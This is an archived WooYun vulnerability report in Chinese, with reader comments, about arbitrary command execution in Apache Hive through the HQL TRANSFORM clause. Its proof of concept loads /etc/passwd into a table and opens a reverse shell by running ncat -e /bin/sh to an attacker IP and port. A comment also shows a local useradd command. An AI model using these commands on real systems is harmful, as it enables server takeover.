{"id": 14540, "wybug_id": "wooyun-2013-018834", "wybug_title": "Hive任意命令/代码执行漏洞", "wybug_corp": "apache", "wybug_author": "kindle", "wybug_date": "2013-02-18 09:57", "wybug_open_date": "2013-02-18 09:57", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-02-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-02-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Hive是建立在 Hadoop 上的数据仓库基础构架。它提供了一系列的工具，可以用来进行数据提取转化加载（ETL），这是一种可以存储、查询和分析存储在 Hadoop 中的大规模数据的机制。Hive 定义了简单的类 SQL 查询语言，称为 QL，它允许熟悉 SQL 的用户查询数据。同时，这个语言也允许熟悉 MapReduce 开发者的开发自定义的 mapper 和 reducer 来处理内建的 mapper 和 reducer 无法完成的复杂的分析工作。 详细说明：  HQL可以通过transform自定义Hive使用的 Map/Reduce 脚本，从而调用shell/python等语言，导致攻击者可以通过hive接口等相关操作方式直接获取服务器权限   漏洞证明：  创建测试表create table if not exists kindle(exploit string);导入/etc/passwd文件到kindle表数据(这步很关键，没数据无法触发漏洞)load data local inpath '/etc/passwd' INTO TABLE kindle;通过transform来自定义hive使用的shell命令，反弹shellselect transform(exploit) USING '/usr/bin/ncat -e /bin/sh ip port' from kindle;删除测试表drop table kindle;   修复方案：  block transform   版权声明：转载请注明来源 kindle@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-02-18 09:57 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  给力    \n     2013-02-18 11:05 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  @xsser 这个应该算特性吧。    \n     2013-02-18 11:08 |    \t\tG8dSnow \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 一直在学习技术、分享知识的路上)\t\t \n  只要读下文档，就能找到这种“漏洞”，只是特性而已，在实际生产环境中需要禁用这些函数    \n     2013-02-18 11:09 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @G8dSnow 关键是如果默认开启的话，对很多应用影响比较大    \n     2013-02-18 11:11 |    \t\tkindle \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:12        | hh)\t\t \n  @xsser 默认是都开启的，而且没有禁用方式，如果要禁用需要自己修改源代码    \n     2013-02-18 11:36 |    \t\tkindle \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:12        | hh)\t\t \n  @G8dSnow 确实是特性没错，但是官方并没提供禁用该函数方法，切默认是开启的，切默认存在严重安全问题。不是漏洞吗？    \n     2013-02-18 13:39 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  @kindle 算比较严重的安全隐患吧，或者很严重的安全问题，漏洞可能还够不上    \n     2013-02-18 15:19 |    \t\tkindle \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:12        | hh)\t\t \n  @xsjswt 哦，因为我见过几乎99%漏洞都是特性导致的，所以我把特性导致的安全问题一律归类到漏洞范围了。漏洞的公共定义比较简单，每个人有自己的理解吧。    \n     2013-02-18 15:24 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @kindle 支持！    \n     2013-03-28 20:39 |    \t\t小龙女 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | venus)\t\t \n  \tHive还提供了本地命令执行的功能，就是类似如下命令。hive>!useradd fuckbg -u 544;你可以执行任意本地命令，这个应该就和xp_cmdshell一样吧，同样存在安全隐患    \n     2013-03-29 14:57 |    \t\tkindle \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:12        | hh)\t\t \n  @小龙女 这个和mysql的一样，mysql也有这个机制，这个不存在安全问题哈。因为你就算链接到!id执行的是你客户端系统的命令。不过hive还支持udf，可以通过udf来执行命令，大风以前的ppt里有讲过    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}